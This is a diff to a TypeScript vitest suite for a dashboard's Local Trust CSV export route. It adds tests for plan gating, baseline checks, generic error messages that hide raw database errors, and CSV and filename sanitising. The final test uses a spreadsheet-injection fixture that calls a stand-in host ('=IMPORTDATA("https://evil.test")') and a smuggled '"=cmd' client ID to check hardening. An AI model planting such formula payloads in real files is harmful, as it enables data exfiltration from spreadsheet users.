@@ -1,6 +1,7 @@
 import { beforeEach, describe, expect, it, vi } from 'vitest'
 
-type TableResult = { data: unknown; error?: { message: string } | null }
+type TableError = { message: string; code?: string }
+type TableResult = { data: unknown; error?: TableError | null }
 type QueryCall = {
   table: string
   operation?: string
@@ -78,7 +79,7 @@ import { PATCH as PATCH_ACTION } from '@/app/api/dashboard/clients/[clientId]/lo
 import { GET as GET_EXPORT } from '@/app/api/dashboard/clients/[clientId]/local-trust/export/route'
 import { getOrCreateLocalTrustSnapshot } from '@/lib/localTrust/store'
 
-function setTable(table: string, data: unknown, error: { message: string } | null = null) {
+function setTable(table: string, data: unknown, error: TableError | null = null) {
   tableResults.set(table, { data, error })
 }
 
@@ -307,6 +308,57 @@ describe('Local Trust export route', () => {
     })
   })
 
+  function setOwnedClient(overrides: Record<string, unknown> = {}) {
+    setTable('clients', {
+      id: 'client-1',
+      brand_name: 'Harbour Advisory',
+      domain: 'harbour.example',
+      industry: 'legal',
+      competitors: [],
+      status: 'active',
+      created_at: '2026-06-01T00:00:00.000Z',
+      ...overrides,
+    })
+  }
+
+  function setSavedSnapshot(overrides: Record<string, unknown> = {}) {
+    setTable('local_trust_snapshots', {
+      id: 'snapshot-1',
+      client_id: 'client-1',
+      account_id: 'account-1',
+      snapshot_month: '2026-06-01',
+      local_trust_score: 71,
+      bucket_scores: [],
+      trust_gaps: [],
+      roi_estimate: null,
+      source_scan_id: null,
+      source_pulse_week: null,
+      created_at: '2026-06-28T00:00:00.000Z',
+      ...overrides,
+    })
+  }
+
+  function setNoMatchingScan() {
+    setTable('scans', {
+      id: 'scan-other',
+      url: 'https://other.example',
+      domain: 'other.example',
+      score: 82,
+      grade: 'A',
+      results: {},
+      account_id: 'account-1',
+      created_at: '2026-06-28T00:00:00.000Z',
+    })
+  }
+
+  function setEmptyExportTables() {
+    setTable('local_trust_profiles', null)
+    setTable('pulse_metrics', [])
+    setTable('agent_competitors', [])
+    setSavedSnapshot()
+    setTable('local_trust_actions', [])
+  }
+
   it('rejects Pro users because export is Enterprise-only', async () => {
     mockGetProfile.mockResolvedValue({ account_id: 'account-1', accounts: { plan: 'pro' } })
 
@@ -452,28 +504,22 @@ describe('Local Trust export route', () => {
     }))
   })
 
-  it('does not use an account latest scan or competitors when the scan domain does not match the client', async () => {
-    setTable('clients', {
-      id: 'client-1',
-      brand_name: 'Harbour Advisory',
-      domain: 'harbour.example',
-      industry: 'legal',
-      competitors: [],
-      status: 'active',
-      created_at: '2026-06-01T00:00:00.000Z',
-    })
-    setTable('scans', {
-      id: 'scan-other',
-      url: 'https://other.example',
-      domain: 'other.example',
-      score: 82,
-      grade: 'A',
-      results: {},
-      account_id: 'account-1',
-      created_at: '2026-06-28T00:00:00.000Z',
-    })
+  it('does not use an account latest scan or competitors when an aggregate Pulse baseline exists but the scan domain does not match', async () => {
+    setOwnedClient()
+    setNoMatchingScan()
     setTable('local_trust_profiles', null)
-    setTable('pulse_weekly_summary', [])
+    setTable('pulse_weekly_summary', [{
+      id: 'summary-aggregate',
+      client_id: 'client-1',
+      scan_week: '2026-06-22',
+      platform: null,
+      total_queries: 10,
+      brand_mentions: 4,
+      sov_score: 40,
+      avg_sentiment_score: 0.4,
+      top_competitors: {},
+      created_at: '2026-06-22T00:00:00.000Z',
+    }])
     setTable('pulse_metrics', [])
     setTable('agent_competitors', [{
       id: 'competitor-other',
@@ -486,19 +532,7 @@ describe('Local Trust export route', () => {
       gap_analysis: 'Wrong scan.',
       created_at: '2026-06-28T00:00:00.000Z',
     }])
-    setTable('local_trust_snapshots', {
-      id: 'snapshot-1',
-      client_id: 'client-1',
-      account_id: 'account-1',
-      snapshot_month: '2026-06-01',
-      local_trust_score: 58,
-      bucket_scores: [],
-      trust_gaps: [],
-      roi_estimate: null,
-      source_scan_id: null,
-      source_pulse_week: null,
-      created_at: '2026-06-28T00:00:00.000Z',
-    })
+    setSavedSnapshot({ local_trust_score: 58 })
     setTable('local_trust_actions', [])
 
     const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
@@ -510,6 +544,218 @@ describe('Local Trust export route', () => {
       scan: null,
       competitors: [],
     }))
+  })
+
+  it('requires a matching scan or aggregate Pulse baseline before creating an export snapshot', async () => {
+    setOwnedClient()
+    setNoMatchingScan()
+    setTable('pulse_weekly_summary', [])
+    setEmptyExportTables()
+
+    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
+    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
+    const body = await res.json()
+
+    expect(res.status).toBe(409)
+    expect(body).toEqual({ error: 'LOCAL_TRUST_BASELINE_REQUIRED' })
+    expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
+    expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
+    expect(queryCalls.some(call => call.table === 'local_trust_actions')).toBe(false)
+  })
+
+  it('does not count platform-only Pulse summary rows as an aggregate export baseline', async () => {
+    setOwnedClient()
+    setTable('scans', null)
+    setTable('pulse_weekly_summary', [{
+      id: 'summary-platform',
+      client_id: 'client-1',
+      scan_week: '2026-06-22',
+      platform: 'gemini',
+      total_queries: 10,
+      brand_mentions: 4,
+      sov_score: 40,
+      avg_sentiment_score: 0.4,
+      top_competitors: {},
+      created_at: '2026-06-22T00:00:00.000Z',
+    }])
+    setEmptyExportTables()
+
+    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
+    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
+    const body = await res.json()
+
+    expect(res.status).toBe(409)
+    expect(body).toEqual({ error: 'LOCAL_TRUST_BASELINE_REQUIRED' })
+    expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
+    expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
+  })
+
+  it('returns a generic 500 and does not create a snapshot when the latest scan query fails', async () => {
+    setOwnedClient()
+    setTable('scans', null, { message: 'sensitive scans policy failure' })
+    setTable('pulse_weekly_summary', [{
+      id: 'summary-aggregate',
+      client_id: 'client-1',
+      scan_week: '2026-06-22',
+      platform: null,
+      total_queries: 10,
+      brand_mentions: 4,
+      sov_score: 40,
+      avg_sentiment_score: 0.4,
+      top_competitors: {},
+      created_at: '2026-06-22T00:00:00.000Z',
+    }])
+    setEmptyExportTables()
+
+    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
+    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
+    const body = await res.json()
+
+    expect(res.status).toBe(500)
+    expect(body).toEqual({ error: 'Export failed' })
+    expect(JSON.stringify(body)).not.toContain('sensitive scans policy failure')
+    expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
+    expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
+  })
+
+  it('returns a generic 500 and does not create a snapshot when Pulse or competitor queries fail', async () => {
+    for (const table of ['pulse_weekly_summary', 'pulse_metrics', 'agent_competitors']) {
+      vi.clearAllMocks()
+      tableResults.clear()
+      queryCalls.length = 0
+      mockFrom.mockImplementation((name: string) => new QueryBuilder(name))
+      mockGetProfile.mockResolvedValue({
+        account_id: 'account-1',
+        accounts: { plan: 'enterprise' },
+      })
+      setOwnedClient()
+      setTable('scans', {
+        id: 'scan-1',
+        url: 'https://harbour.example',
+        domain: 'harbour.example',
+        score: 82,
+        grade: 'A',
+        results: {},
+        account_id: 'account-1',
+        created_at: '2026-06-28T00:00:00.000Z',
+      })
+      setTable('pulse_weekly_summary', [{
+        id: 'summary-aggregate',
+        client_id: 'client-1',
+        scan_week: '2026-06-22',
+        platform: null,
+        total_queries: 10,
+        brand_mentions: 4,
+        sov_score: 40,
+        avg_sentiment_score: 0.4,
+        top_competitors: {},
+        created_at: '2026-06-22T00:00:00.000Z',
+      }])
+      setTable('pulse_metrics', [])
+      setTable('agent_competitors', [])
+      setTable(table, null, { message: `sensitive ${table} failure` })
+      setTable('local_trust_profiles', null)
+      setSavedSnapshot()
+      setTable('local_trust_actions', [])
+
+      const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
+      const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
+      const body = await res.json()
+
+      expect(res.status).toBe(500)
+      expect(body).toEqual({ error: 'Export failed' })
+      expect(JSON.stringify(body)).not.toContain(`sensitive ${table} failure`)
+      expect(mockCalculateLocalTrust).not.toHaveBeenCalled()
+      expect(queryCalls.some(call => call.table === 'local_trust_snapshots')).toBe(false)
+    }
+  })
+
+  it('does not leak raw snapshot errors in 500 responses', async () => {
+    setOwnedClient()
+    setTable('scans', null)
+    setTable('pulse_weekly_summary', [{
+      id: 'summary-aggregate',
+      client_id: 'client-1',
+      scan_week: '2026-06-22',
+      platform: null,
+      total_queries: 10,
+      brand_mentions: 4,
+      sov_score: 40,
+      avg_sentiment_score: 0.4,
+      top_competitors: {},
+      created_at: '2026-06-22T00:00:00.000Z',
+    }])
+    setTable('pulse_metrics', [])
+    setTable('local_trust_profiles', null)
+    setTable('local_trust_snapshots', null, { message: 'sensitive snapshot write failure' })
+
+    const req = new Request('http://localhost/api/dashboard/clients/client-1/local-trust/export')
+    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client-1' }) })
+    const body = await res.json()
+
+    expect(res.status).toBe(500)
+    expect(body).toEqual({ error: 'Export failed' })
+    expect(JSON.stringify(body)).not.toContain('sensitive snapshot write failure')
+  })
+
+  it('sanitizes export filenames and hardens formula-like CSV cells', async () => {
+    mockCalculateLocalTrust.mockReturnValue({
+      client_id: 'client/1 "=cmd',
+      account_id: 'account-1',
+      snapshot_month: '2026-06-01',
+      local_trust_score: 71,
+      bucket_scores: [],
+      trust_gaps: [{
+        stableKey: 'formula-action',
+        title: '=IMPORTDATA("https://evil.test")',
+        bucket: 'proof_depth',
+        impact: 'high',
+        effort: 'medium',
+        rationale: 'Proof is thin.',
+        suggestedTarget: 'Case studies',
+      }],
+      roi_estimate: null,
+      source_scan_id: null,
+      source_pulse_week: '2026-06-22',
+    })
+    setOwnedClient({ id: 'client/1 "=cmd' })
+    setTable('scans', null)
+    setTable('pulse_weekly_summary', [{
+      id: 'summary-aggregate',
+      client_id: 'client/1 "=cmd',
+      scan_week: '2026-06-22',
+      platform: null,
+      total_queries: 10,
+      brand_mentions: 4,
+      sov_score: 40,
+      avg_sentiment_score: 0.4,
+      top_competitors: {},
+      created_at: '2026-06-22T00:00:00.000Z',
+    }])
+    setTable('pulse_metrics', [])
+    setTable('local_trust_profiles', null)
+    setSavedSnapshot({ client_id: 'client/1 "=cmd', source_pulse_week: '2026-06-22' })
+    setTable('local_trust_actions', [{
+      id: 'action-formula',
+      client_id: 'client/1 "=cmd',
+      snapshot_id: 'snapshot-1',
+      stable_key: 'formula-action',
+      title: 'Old formula title',
+      bucket: 'proof_depth',
+      impact: 'high',
+      effort: 'medium',
+      status: 'open',
+      created_at: '2026-06-28T00:00:00.000Z',
+      updated_at: '2026-06-28T00:00:00.000Z',
+    }])
+
+    const req = new Request('http://localhost/api/dashboard/clients/client%2F1%20%22%3Dcmd/local-trust/export')
+    const res = await GET_EXPORT(req, { params: Promise.resolve({ clientId: 'client/1 "=cmd' }) })
+    const csv = await res.text()
+
+    expect(res.status).toBe(200)
+    expect(res.headers.get('content-disposition')).toBe('attachment; filename="local-trust-client-1-cmd.csv"')
+    expect(csv).toContain('Top Action,"\'=IMPORTDATA(""https://evil.test"")"')
   })
 })
 
